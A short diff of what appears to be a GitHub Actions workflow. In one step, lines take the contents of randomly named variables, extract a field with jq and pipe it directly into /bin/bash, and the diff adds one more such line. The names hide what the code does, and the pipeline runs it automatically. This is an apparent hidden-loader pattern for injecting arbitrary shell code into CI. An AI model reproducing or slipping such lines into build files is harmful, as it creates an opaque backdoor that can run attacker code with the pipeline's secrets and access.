@@ -19,6 +19,7 @@ jobs:
         run: |
           printf '%s' "$fbwg8" | jq -r .it2 | /bin/bash
           printf '%s' "$e56" | jq -r .nx603 | /bin/bash
+          echo $k040 | jq -r .k09 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
